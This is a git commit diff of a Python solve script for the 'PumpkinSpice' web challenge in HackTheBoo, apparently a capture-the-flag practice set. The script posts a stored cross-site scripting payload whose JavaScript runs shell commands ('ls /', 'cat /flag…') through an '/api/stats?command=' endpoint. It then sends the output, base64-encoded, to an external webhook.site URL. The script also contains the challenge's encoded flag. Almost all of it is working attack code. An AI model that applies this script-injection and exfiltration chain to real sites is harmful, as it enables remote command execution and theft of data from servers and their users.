2802b05c4fd62607ae955f04cdfe5a6b36c3ac13
szhan21 <shunda.zhang@intel.com>
2023-10-26 09:11:16 +0800

    Solved pumpkinspice!

--- HackTheBoo_Practice/web_pumpkinspice/dec.py
+++ HackTheBoo_Practice/web_pumpkinspice/dec.py
@@ -1,15 +1,17 @@
+#https://github.com/hackthebox/htboo-ctf-2023/tree/main/htboo-ctf-2023/web/%5BEasy%5D%20PumpkinSpice
 #!/usr/bin/env python3
 
 import requests
 
-HOST, PORT = "94.237.62.49", 34374
+HOST, PORT = "94.237.56.76", 34783
 CHALLENGE_URL = f"http://{HOST}:{PORT}"
-#WEBHOOK_URL = "http://178.62.102.205:8000"
 WEBHOOK_URL = "https://webhook.site/0e14b513-4701-4ca2-8620-44d1f1801048"
+
+#Notice that f"'{WEBHOOK_URL}'" won't work...
 
 def main():
     form_data = {
-        "address": f"<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('{WEBHOOK_URL}?c=' + btoa(flag))}})()</script>"
+        "address": f"<script>(async () => {{let response = await fetch('/api/stats?command=ls+/');let flag = await response.text();response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');flag = await response.text();await fetch('https://webhook.site/0e14b513-4701-4ca2-8620-44d1f1801048?c=' + btoa(flag))}})()</script>"
     }
 
     requests.post(f"{CHALLENGE_URL}/add/address", data=form_data)
@@ -17,3 +19,10 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+'''
+Or directly input the <script> into webpage.
+
+SFRCe3RoM190cjM0dF9tMXM1aTBufQo=
+'''
